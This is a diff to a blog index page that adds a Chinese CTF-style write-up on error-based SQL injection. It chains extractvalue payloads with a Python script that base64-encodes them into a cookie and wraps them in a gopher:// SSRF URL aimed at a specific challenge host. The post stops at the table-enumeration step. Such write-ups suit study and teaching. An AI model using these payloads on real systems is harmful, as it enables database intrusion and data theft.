@@ -136,6 +136,51 @@
     <header class="article-header">
         
         <h1 itemprop="name">
+            <a href="/2023/07/19/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">报错注入</a>
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="http://example.com/page/2/index.html">
+    
+    <i class="icon-calendar vm"></i>
+    
+    <time class="vm" datetime="2023-07-19T08:36:06.000Z" itemprop="datePublished">2023-07-19</time>
+</a>
+
+            
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>通过报错信息，可以找到闭合点为admin’) #,但是很明显，此处有报错信息，直接使用报错注入。<br>payload为admin’) and extractvalue(1, concat(0x7e, (select @@version),0x7e)) # 检查是否可以进行报错注入<br>运用python脚本转换为gopher协议</p>
+<p>import urllib.parse<br>import base64<br>host &#x3D; “127.0.0.1:80”<br>payload &#x3D; “admin’) and extractvalue(1, concat(0x7e, (select @@version),0x7e)) #”<br>base64_payload &#x3D; str(base64.b64encode(payload.encode(“utf-8”)), “utf-8”)<br>cookie&#x3D;”this_is_your_cookie&#x3D;”+base64_payload</p>
+<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
+<p>“””.format(host,cookie)</p>
+<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
+<p>获得payload如下</p>
+<p>gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_GET%2520&#x2F;index.php%2520HTTP&#x2F;1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application&#x2F;x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IEBAdmVyc2lvbiksMHg3ZSkpICM%253D%250D%250A%250D%250A<br>1</p>
+<p>如图可以看到，数据库信息被回显出来了，所以报错信息可以使用，接下来就是查库，查表、查列了。<br>查数据库：</p>
+<p>查数据库<br>查数据库：admin’) and extractvalue(1, concat(0x7e, (select database()),0x7e)) #<br>python脚本如下</p>
+<p>import urllib.parse<br>import base64<br>host &#x3D; “127.0.0.1:80”<br>payload &#x3D; “admin’) and extractvalue(1, concat(0x7e, (select database()),0x7e)) #”<br>base64_payload &#x3D; str(base64.b64encode(payload.encode(“utf-8”)), “utf-8”)<br>cookie&#x3D;”this_is_your_cookie&#x3D;”+base64_payload</p>
+<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
+<p>“””.format(host,cookie)</p>
+<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
+<p>url：<a target="_blank" rel="noopener" href="http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSAj%250D%250A%250D%250A">http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSAj%250D%250A%250D%250A</a></p>
+<p>数据库为security</p>
+<p>查表<br>查表：admin’) and extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema&#x3D;’security’),0x7e)) #</p>
+
+        
+    </section>
+</article>
+
+
+    <article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
             <a href="/2023/07/05/robots-txt%E6%96%87%E4%BB%B6/">robots.txt文件</a>
         </h1>
         
